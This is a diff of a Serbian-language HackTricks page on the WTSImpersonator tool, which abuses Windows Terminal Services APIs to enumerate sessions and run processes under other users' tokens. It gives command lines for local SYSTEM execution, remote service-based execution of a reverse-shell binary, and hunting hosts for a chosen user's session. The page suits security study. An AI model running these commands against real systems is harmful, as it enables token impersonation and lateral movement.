@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Alat **WTS Impersonator** iskorišćava RPC imenovani kanal **"\\pipe\LSM_API_service"** za prikriveno nabrajanje prijavljenih korisnika i preuzimanje njihovih tokena, zaobilazeći tradicionalne tehnike Token Impersonation. Ovaj pristup omogućava neometano lateralno kretanje unutar mreža. Zasluge za inovaciju koja stoji iza ove tehnike pripadaju **Omriju Basu, čiji je rad dostupan na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>
+**WTSImpersonator**, čiji je autor Omri Baso, koristi Windows Terminal Services API-je izložene kroz RPC named pipe `\\pipe\LSM_API_service` kako bi enumerirao prijavljene sesije i pokrenuo proces sa tokenom izabranog korisnika. Podržava lokalnu enumeraciju i izvršavanje, kao i workflow-e zasnovane na udaljenom servisu.<sup>[[1]](#references)</sup>
 
-### Osnovna funkcionalnost
+## Osnovna funkcionalnost
 
-Alat funkcioniše kroz niz API poziva:
-```bash
+Njegov tok lokalnog izvršavanja koristi sledeći niz API poziva:<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Ključni moduli i upotreba
+## Moduli i upotreba
 
-- **Enumerating Users**: Lokalna i udaljena enumeracija korisnika moguća je pomoću alata, uz korišćenje komandi za oba scenarija:
+- **Enumeracija korisnika:** Alat može da enumeriše sesije na lokalnom ili udaljenom hostu.
 
 - Lokalno:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Udaljeno, navođenjem IP adrese ili hostname-a:
+- Udaljeno, navedite IP adresu ili hostname:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Executing Commands**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst za rad. Za lokalno izvršavanje potrebni su samo WTSImpersonator executable i komanda:
+- **Izvršavanje komandi:** Moduli `exec` i `exec-remote` zahtevaju kontekst servisa. Microsoft navodi da `WTSQueryUserToken` zahteva da caller radi kao `LocalSystem` sa privilegijom `SE_TCB_NAME`.<sup>[[2]](#references)</sup>
 
-- Primer lokalnog izvršavanja komande:
+- Lokalno izvršavanje komande:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe može se koristiti za dobijanje Service konteksta:
+- PsExec može da pokrene komandni prompt kao `LocalSystem` radi testiranja:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Remote Command Execution**: Podrazumeva kreiranje i instaliranje servisa na udaljenom sistemu, slično kao kod PsExec.exe, čime se omogućava izvršavanje sa odgovarajućim dozvolama.
+- **Udaljeno izvršavanje komandi:** Udaljeni režim kreira servis na targetu u workflow-u sličnom PsExec-u i zato zahteva prava za instaliranje i pokretanje tog servisa.<sup>[[1]](#references)</sup>
 
-- Primer udaljenog izvršavanja:
+- Primer:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Module**: Cilja određene korisnike na više mašina i izvršava kod pod njihovim credentialima. Ovo je naročito korisno za ciljanje Domain Admins korisnika sa lokalnim admin pravima na više sistema.
+- **Lov na korisnike:** Modul `user-hunter` pretražuje listu hostova u potrazi za sesijom navedenog korisnika i pokušava da izvrši prosleđeni program u tom kontekstu.<sup>[[1]](#references)</sup>
 - Primer upotrebe:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## Reference
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: funkcija `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
